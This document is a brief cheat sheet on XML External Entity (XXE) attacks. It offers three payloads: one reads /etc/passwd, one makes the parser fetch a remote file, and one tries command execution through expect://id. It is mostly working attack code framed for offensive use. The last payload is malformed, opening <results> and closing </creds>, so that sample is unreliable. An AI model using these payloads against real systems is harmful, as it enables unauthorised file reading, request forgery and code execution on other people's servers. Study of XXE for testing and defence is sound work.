## XML External Entity (XXE) Attack  
Code is injected into an XML file that is interpreted and executed by an XML parser  

### Examples  

#### Accessing a local file on the parser  

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

#### Access a remote file on the parser 
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.example.com/text.txt" >]>
<foo>&xxe;</foo>
```
#### Remote Code Execution on the Parser
*php://expect is disabled by default, but maybe you'll get lucky  

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<results>
  <a>`&xxe;`</a>
</creds>
```
